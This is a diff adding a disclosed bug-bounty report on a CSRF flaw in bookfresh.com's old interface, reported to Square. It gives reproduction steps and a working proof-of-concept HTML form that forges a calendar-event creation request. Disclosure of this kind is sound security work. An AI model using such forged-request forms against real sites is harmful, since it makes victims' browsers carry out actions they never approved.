@@ -1,0 +1,47 @@
+ReportLink:https://hackerone.com/reports/30015
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/anshuman_bh
+ReportedTo:Square(square)
+BountyAmount:250.0
+Severity:
+State:Closed
+DateOfDisclosure:04.02.2015 19:01:25
+
+Summary:
+
+* Signup for a free account at the URL - https://www.bookfresh.com/users/signup
+
+* Authenticate to the account created above.
+
+* Navigate to My Business -> Settings -> Account Info -> Account Type -> Edit
+
+* Click on "Delete your account" and confirm the deletion on the next page. Notice that you receive an email about the same.
+
+* Try authenticating back to your account. Notice that the UI changes slightly with a message on the page saying "A verification message has been sent to the email address you provided. Please click on the link to complete the sign-up process. Didn't get the email? Send it again." Click on "Send it again" and confirm the sign up by clicking on the link received in the email. 
+
+* Next, submit the following HTML:
+
+```
+<html>
+  <body>
+    <form action="https://www.bookfresh.com/index.html" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="action" value="add&#95;event" />
+      <input type="hidden" name="view" value="add&#95;event" />
+      <input type="hidden" name="date&#95;start" value="2014&#45;10&#45;08&#32;12&#58;00" />
+      <input type="hidden" name="date&#95;end" value="2014&#45;10&#45;08&#32;13&#58;00" />
+      <input type="hidden" name="name" value="csrftest2" />
+      <input type="hidden" name="status" value="1" />
+      <input type="hidden" name="repeat&#95;events" value="norepeat" />
+      <input type="hidden" name="repeat&#95;interval" value="1" />
+      <input type="hidden" name="end&#95;type" value="after" />
+      <input type="hidden" name="no&#95;of&#95;times" value="2" />
+      <input type="hidden" name="is&#95;repeat" value="0" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
+
+* Navigate to Calendar and notice that a new event is created for October 8th called "csrftest2". See screenshot. 
+
+PS - The first 5 steps above are only to show that this works only on the old UI after you have deleted and signed in the same account again. The new UI has CSRF protections but the old one doesn't. If the old UI is discontinued, users should not be allowed to use it at all. 
